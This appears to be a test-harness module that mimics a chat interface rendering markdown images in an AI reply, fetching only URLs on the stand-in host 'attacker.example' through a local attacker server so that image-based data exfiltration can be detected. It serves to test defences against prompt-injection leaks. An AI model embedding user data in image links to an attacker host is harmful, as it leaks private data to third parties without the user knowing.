// Plays the chat UI: fetches every image in a reply, the way a browser would when it renders markdown.
// Only "attacker.example" is fetched, and it is routed to the local attacker server. Nothing leaves the machine.
const IMAGE_URLS = /!\[[^\]]*\]\(([^)\s]+)\)|<img[^>]+src="([^"]+)"/g;

export async function renderImages(markdown, { attackerBase }) {
  const fetched = [];
  for (const m of markdown.matchAll(IMAGE_URLS)) {
    let url;
    try { url = new URL(m[1] ?? m[2]); } catch { continue; }
    if (url.hostname !== 'attacker.example') continue;
    const local = attackerBase + url.pathname + url.search;
    await (await fetch(local)).arrayBuffer();
    fetched.push(local);
  }
  return fetched;
}
